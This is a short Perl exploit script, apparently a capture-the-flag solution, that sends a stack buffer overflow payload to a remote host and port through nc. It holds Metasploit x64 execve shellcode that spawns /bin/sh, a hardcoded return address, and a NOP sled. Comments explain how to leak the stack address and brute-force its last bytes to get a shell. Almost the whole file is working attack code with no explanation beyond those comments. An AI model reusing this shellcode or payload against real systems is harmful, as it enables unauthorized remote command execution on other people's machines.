#!/usr/bin/perl
#chmod +x solution.pl
#usage ./solution.pl | nc 104.155.16.78 62123

$| = 1;
# linux/x64/exec - 56 bytes
# http://www.metasploit.com
# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
# PrependSetreuid=false, PrependSetuid=false, 
# PrependSetresgid=false, PrependSetregid=false, 
# PrependSetgid=false, PrependChrootBreak=false, 
# AppendExit=false, CMD=echo hello world
my $buf = "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00" .
"\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8" .
"\x11\x00\x00\x00\x65\x63\x68\x6f\x20\x68\x65\x6c\x6c\x6f" .
"\x20\x77\x6f\x72\x6c\x64\x00\x56\x57\x48\x89\xe6\x0f\x05";

# linux/x64/exec - 47 bytes 
# http://www.metasploit.com
# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
# PrependSetreuid=false, PrependSetuid=false, 
# PrependSetresgid=false, PrependSetregid=false, 
# PrependSetgid=false, PrependChrootBreak=false, 
# AppendExit=false, CMD=/bin/sh
my $binsh = "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00" .
"\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8" .
"\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57" .
"\x48\x89\xe6\x0f\x05";

#Note - you MUST leak the address before you can find a valid 8 byte address to begin
#targeting - after you find the base address you can write a script to brute force the
#stack and eventually get a shell …
#when used only against the binary use \x88\xe5
#\xf8\xe5 worked against the pythond during testing
#you can get a leak that will get you close, specifically you can see 0x7fffffffe5** - the 
#brute forcing part involves finding the last 2 hex digits.
$target="\xf8\xe5\xff\xff\xff\x7f\x00\x00";

print "A"x49 . $target . $target . "\x90"x300 . $binsh . "\x0a";

while(<>){print;}

